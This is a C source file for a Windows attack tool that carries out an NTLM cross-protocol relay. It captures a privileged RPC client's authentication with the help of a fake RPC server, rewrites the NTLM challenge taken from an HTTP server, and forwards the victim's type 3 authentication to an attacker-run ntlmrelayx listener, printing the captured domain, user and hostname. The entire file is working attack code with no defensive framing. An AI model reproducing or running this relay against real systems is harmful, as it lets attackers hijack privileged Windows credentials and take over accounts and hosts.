#define WIN32_LEAN_AND_MEAN

#include "Windows.h"
#include "stdio.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <wincrypt.h>
#include "HTTPCrossProtocolRelay.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Crypt32.lib")

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

#define DEFAULT_BUFLEN 8192

extern BOOL g_SuccessTrigger;

void DoHTTPCrossProtocolRelay(wchar_t* remoteIpRelay, wchar_t* remotePortRelay, wchar_t* rpcServerIp, wchar_t* rpcServerPort, wchar_t* httpCrossProtocolRelayPort)
{
	int iResult = 0;
	int recvbuflen = DEFAULT_BUFLEN;
	int sendbuflen = DEFAULT_BUFLEN;
	int ntlmIndex = 0;
	BOOL conn_flag = FALSE;
	char sendbuf[DEFAULT_BUFLEN];
	char recvbuf[DEFAULT_BUFLEN];
	char ntlmType1[DEFAULT_BUFLEN];
	char ntlmType2[DEFAULT_BUFLEN];
	int ntlmType2Len = 0;
	char ntlmType3[DEFAULT_BUFLEN];
	int ntlmType3Len = 0;

	char* httpPacketType1;
	int httpPacketType1Len;
	char* httpPacketType3;
	int httpPacketType3Len;

	char type1BakBuffer[DEFAULT_BUFLEN];
	int type1BakLen = 0;

	SOCKET RPCSocketListen = CreateRPCSocketListen(httpCrossProtocolRelayPort);
	SOCKET RPCSocketReflect = NULL;
	SOCKET HTTPSocket = CreateHTTPSocket(remoteIpRelay, remotePortRelay);

	do {
		iResult = recv(RPCSocketListen, recvbuf, recvbuflen, 0);
		if (!conn_flag) {
			RPCSocketReflect = CreateRPCSocketReflect(rpcServerIp, rpcServerPort);
			conn_flag = TRUE;
		}
		ntlmIndex = findNTLMBytes(recvbuf, iResult);
		// if the rpc packet contains ntlm auth information we do our magic (cross protocol relay)
		if (ntlmIndex > 0) {
			// save the rpc packet of type1 authentication to forward it later to the fake RPC server (we reuse the RogueOxidResolver)
			memcpy(type1BakBuffer, recvbuf, iResult);
			type1BakLen = iResult;
			// copy in ntlmType1 the extracted auth information from the received buffer
			memcpy(ntlmType1, recvbuf + ntlmIndex, iResult - ntlmIndex);
			// forge the http packet with the type 1 auth and send it to the http server
			httpPacketType1 = ForgeHTTPRequestType1(ntlmType1, iResult - ntlmIndex, &httpPacketType1Len, remoteIpRelay);
			if (send(HTTPSocket, httpPacketType1, httpPacketType1Len, 0) == SOCKET_ERROR) {
				printf("[!] Couldn't forge the http packet with the type 1 auth and send it to the http server.\n");
				break;
			}
			Sleep(1000);
			// receive the http response from the http server including type2 message
			iResult = recv(HTTPSocket, recvbuf, recvbuflen, 0);
			if (iResult == SOCKET_ERROR) {
				printf("[!] Couldn't receive the http response from the http server\n");
				break;
			}
			// extract from the http packet the type2 ntlm message
			ExtractType2FromHttp(recvbuf, iResult, ntlmType2, &ntlmType2Len);
			// here we communicate with our fake RPC Server to have just the template for rpc packets, sending the type1
			if (send(RPCSocketReflect, type1BakBuffer, type1BakLen, 0) == SOCKET_ERROR) {
				printf("[!] Couldn't communicate with the fake RPC Server\n");
				break;
			}
			hexDump2((char*)"type1 received\n", type1BakBuffer, type1BakLen);
			// receiving the type2 message from the fake RPC Server to use as a template for our relayed auth
			iResult = recv(RPCSocketReflect, recvbuf, recvbuflen, 0);
			if (iResult == SOCKET_ERROR) {
				printf("[!] Couldn't receive the type2 message from the fake RPC Server\n");
				break;
			}
			hexDump2((char*)"type2 forged by fake rpc server\n", recvbuf, iResult);
			// get the ntlmindex from the type2 message received from the fake rpc server
			ntlmIndex = findNTLMBytes(recvbuf, iResult);
			// in this function we take the packet template from a real rpc server and we alter the authentication part, 
			// in this case we change the original type2 with the type2 received by the http server. We also adjust the len of the rpc packet fragLen and authLen
			// to not break the rpc protocol
			ForgeAndAlterType2Rpc(recvbuf, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
			// send the altered type2 to the rpc client (the privileged auth)
			if (send(RPCSocketListen, sendbuf, ntlmIndex + ntlmType2Len, 0) == SOCKET_ERROR) {
				printf("[!] Couldn't send the altered type2 to the rpc client (the privileged auth)\n");
				break;
			}
			// receive the type3 auth from the rpc client. This is the privileged AUTH that the client is sending us
			iResult = recv(RPCSocketListen, recvbuf, recvbuflen, 0);
			if (iResult == SOCKET_ERROR) {
				printf("[!] Couldn't receive the type3 auth from the rpc client\n");
				break;
			}
			// extract the type3 auth from the rpc packet
			ExtractType3FromRpc(recvbuf, iResult, ntlmType3, &ntlmType3Len);
			// forge the http packet containing the type3 AUTH
			httpPacketType3 = ForgeHTTPRequestType3(ntlmType3, ntlmType3Len, &httpPacketType3Len, remoteIpRelay);
			// send the type3 AUTH to the http server, cross the finger :D
			if (send(HTTPSocket, httpPacketType3, httpPacketType3Len, 0) == SOCKET_ERROR) {
				printf("[!] Couldn't send the type3 AUTH to the http server\n");
				break;
			}
			ParseUsernameFromType3(ntlmType3, ntlmType3Len);
			// receive the output from the http server. If using ntlmrelayx a 404 response means a succesfull relay.
			iResult = recv(HTTPSocket, recvbuf, recvbuflen, 0);
			if (iResult == SOCKET_ERROR) {
				printf("[!] Couldn't receive the output from the http server\n");
				break;
			}
			if (recvbuf[9] == '4' && recvbuf[10] == '0' && recvbuf[11] == '4')
				printf("[+] Relaying seems successfull, check ntlmrelayx output!\n");
			else
				printf("[!] Relaying failed :(\n");
			break;
		}
	} while (iResult > 0);
	closesocket(RPCSocketListen);
	closesocket(RPCSocketReflect);
	closesocket(HTTPSocket);
	WSACleanup();
}

SOCKET CreateRPCSocketListen(const wchar_t* listenport) {
	WSADATA wsaData;
	int iResult;
	char listen_port_a[12];

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo* result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(-1);
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(listen_port_a, 0, 12);
	wcstombs(listen_port_a, listenport, 12);

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, listen_port_a, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(-1);
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(-1);
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	freeaddrinfo(result);

	printf("[*] RPC relay server listening on port %S ...\n", listenport);
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}

	// Accept a client socket
	ClientSocket = accept(ListenSocket, (sockaddr*)NULL, (int*)NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(-1);
	}
	printf("[+] Received the relayed authentication for iRemUnknown2 query on port %S\n", listenport);
	// No longer need server socket
	closesocket(ListenSocket);
	return ClientSocket;
}

SOCKET CreateRPCSocketReflect(const wchar_t* remoteRPCIp, const wchar_t* remoteRPCport) {
	//----------------------
	// Initialize Winsock

	char remoteRPCIp_a[20];
	char remoteRPCport_a[12];
	int remotePort;
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
		return 1;
	}
	//----------------------
	// Create a SOCKET for connecting to server
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.

	memset(remoteRPCport_a, 0, 12);
	wcstombs(remoteRPCport_a, remoteRPCport, 12);
	memset(remoteRPCIp_a, 0, 20);
	wcstombs(remoteRPCIp_a, remoteRPCIp, 20);
	remotePort = atoi(remoteRPCport_a);
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(remoteRPCIp_a);
	clientService.sin_port = htons(remotePort);

	//----------------------
	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)& clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(ConnectSocket);
		if (iResult == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("[*] Connected to RPC Server %S on port %S\n", remoteRPCIp, remoteRPCport);
	return ConnectSocket;
}

SOCKET CreateHTTPSocket(const wchar_t* remoteHTTPIp, const wchar_t* remoteHttpPort) {
	//----------------------
	// Initialize Winsock

	char remoteHTTPIp_a[20];
	char remotePort_a[12];
	int remotePort;
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
		return 1;
	}
	//----------------------
	// Create a SOCKET for connecting to server
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.

	memset(remotePort_a, 0, 12);
	wcstombs(remotePort_a, remoteHttpPort, 12);
	memset(remoteHTTPIp_a, 0, 20);
	wcstombs(remoteHTTPIp_a, remoteHTTPIp, 20);
	remotePort = atoi(remotePort_a);
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(remoteHTTPIp_a);
	clientService.sin_port = htons(remotePort);

	//----------------------
	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)& clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(ConnectSocket);
		if (iResult == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("[*] Connected to ntlmrelayx HTTP Server %S on port %S\n", remoteHTTPIp, remoteHttpPort);
	return ConnectSocket;
}

char* ForgeHTTPRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len, wchar_t* httpIp) {
	char httpPacketTemplate[] = "GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\n\r\n";
	char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
	int b64ntlmLen;
	char httpIp_a[20];
	memset(httpIp_a, 0, 20);
	wcstombs(httpIp_a, httpIp, 20);
	char* b64ntlmTmp = base64Encode(ntlmsspType1, ntlmsspType1Len, &b64ntlmLen);
	char b64ntlm[DEFAULT_BUFLEN];
	memset(b64ntlm, 0, DEFAULT_BUFLEN);
	memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
	*httpPacketType1Len = sprintf(httpPacket, httpPacketTemplate, httpIp_a, b64ntlm);
	return httpPacket;
}

char* ForgeHTTPRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len, wchar_t* httpIp) {
	char httpPacketTemplate[] = "GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\n\r\n";
	char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
	int b64ntlmLen;
	char httpIp_a[20];
	memset(httpIp_a, 0, 20);
	wcstombs(httpIp_a, httpIp, 20);
	char* b64ntlmTmp = base64Encode(ntlmsspType3, ntlmsspType3Len, &b64ntlmLen);
	char b64ntlm[DEFAULT_BUFLEN];
	memset(b64ntlm, 0, DEFAULT_BUFLEN);
	memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
	*httpPacketType3Len = sprintf(httpPacket, httpPacketTemplate, httpIp_a, b64ntlm);
	return httpPacket;
}

void ExtractType2FromHttp(char* httpPacket, int httpPacketLen, char* ntlmType2, int* ntlmType2Len) {
	char b64Type2[DEFAULT_BUFLEN];
	int b64Type2Len = 0;
	findBase64NTLM(httpPacket, httpPacketLen, b64Type2, &b64Type2Len);
	char* decodedType2Tmp = base64Decode(b64Type2, b64Type2Len, ntlmType2Len);
	memset(ntlmType2, 0, DEFAULT_BUFLEN);
	memcpy(ntlmType2, decodedType2Tmp, *ntlmType2Len);
}

void ForgeAndAlterType2Rpc(char* rpcType2Packet, int rpcType2PacketLen, int authIndexStart, char* ntlmType2, int ntlmType2Len, char* newRpcType2Packet) {
	short* fragLen = (short*)rpcType2Packet + 4;
	short* authLen = (short*)rpcType2Packet + 5;
	int ntlmPacketLen = rpcType2PacketLen - authIndexStart;
	*fragLen = *fragLen - ntlmPacketLen + ntlmType2Len;
	*authLen = ntlmType2Len;
	memcpy(newRpcType2Packet, rpcType2Packet, authIndexStart);
	memcpy(newRpcType2Packet + authIndexStart, ntlmType2, ntlmType2Len);
}

void ExtractType3FromRpc(char* rpcPacket, int rpcPacketLen, char* ntlmType3, int* ntlmType3Len) {
	int ntlmIndex = findNTLMBytes(rpcPacket, rpcPacketLen);
	short* authLen = (short*)rpcPacket + 5;
	memcpy(ntlmType3, rpcPacket + ntlmIndex, *authLen);
	*ntlmType3Len = (int)* authLen;
}

void ParseUsernameFromType3(char* ntlmType3, int ntlmType3Len) {
	short* domainLen, * userLen, * hostnameLen;
	__int32* domainOffset, * userOffset, * hostnameOffset;
	wchar_t domain[32], user[32], hostname[32];
	domainLen = (short*)(ntlmType3 + 28);
	userLen = (short*)(ntlmType3 + 36);
	hostnameLen = (short*)(ntlmType3 + 44);
	domainOffset = (__int32*)(ntlmType3 + 32);
	userOffset = (__int32*)(ntlmType3 + 40);
	hostnameOffset = (__int32*)(ntlmType3 + 48);
	memset(domain, 0, 32);
	memcpy(domain, ntlmType3 + (*domainOffset), *domainLen);
	memset(user, 0, 32);
	memcpy(user, ntlmType3 + (*userOffset), *userLen);
	memset(hostname, 0, 32);
	memcpy(hostname, ntlmType3 + (*hostnameOffset), *hostnameLen);
	printf("[+] Got NTLM type 3 AUTH message from %S\\%S with hostname %S \n", domain, user, hostname);
	g_SuccessTrigger = TRUE;
}

int findNTLMBytes(char* bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int findBase64NTLM(char* buffer, int buffer_len, char* outbuffer, int* outbuffer_len) {
	char pattern_head[] = { 'N', 'T', 'L', 'M', ' ' };
	char pattern_tail[2] = { 0x0D, 0x0A }; // \r\n
	int index_start = 0;
	for (int i = 0; i < buffer_len; i++) {
	}
	for (int i = 0; i < buffer_len; i++) {
		if (buffer[i] == pattern_head[index_start]) {
			index_start = index_start + 1;
			if (index_start == sizeof(pattern_head)) {
				index_start = i + 1;
				break;
			}
		}
	}
	*outbuffer_len = 0;
	for (int i = index_start; i < buffer_len; i++) {
		if (buffer[i] == pattern_tail[0] && buffer[i + 1] == pattern_tail[1]) {
			break;
		}
		outbuffer[(*outbuffer_len)] = buffer[i];
		*outbuffer_len = (*outbuffer_len) + 1;
	}
	//printf("*outbuffer_len: %d and index_start: %d", *outbuffer_len,index_start);
	//hexDump2(NULL, outbuffer, *outbuffer_len);
	return 0;
}

char* base64Encode(char* text, int textLen, int* b64Len) {
	*b64Len = DEFAULT_BUFLEN;
	char* b64Text = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *b64Len);
	if (!CryptBinaryToStringA((const BYTE*)text, textLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Text, (DWORD*)b64Len)) {
		printf("CryptBinaryToStringA failed with error code %d", GetLastError());
		HeapFree(GetProcessHeap(), 0, b64Text);
		b64Text = NULL;
		exit(-1);
	}
	return b64Text;
}

char* base64Decode(char* b64Text, int b64TextLen, int* bufferLen) {
	*bufferLen = DEFAULT_BUFLEN;
	char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *bufferLen);
	if (!CryptStringToBinaryA((LPCSTR)b64Text, b64TextLen, CRYPT_STRING_BASE64, (BYTE*)buffer, (DWORD*)bufferLen, NULL, NULL)) {
		printf("CryptStringToBinaryA failed with error code %d", GetLastError());
		HeapFree(GetProcessHeap(), 0, buffer);
		buffer = NULL;
		exit(-1);
	}
	return buffer;
}


//debug
void hexDump2(char* desc, void* addr, int len) {
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	if (len == 0) {
		printf("  ZERO LENGTH\n");
		return;
	}
	if (len < 0) {
		printf("  NEGATIVE LENGTH: %i\n", len);
		return;
	}

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}
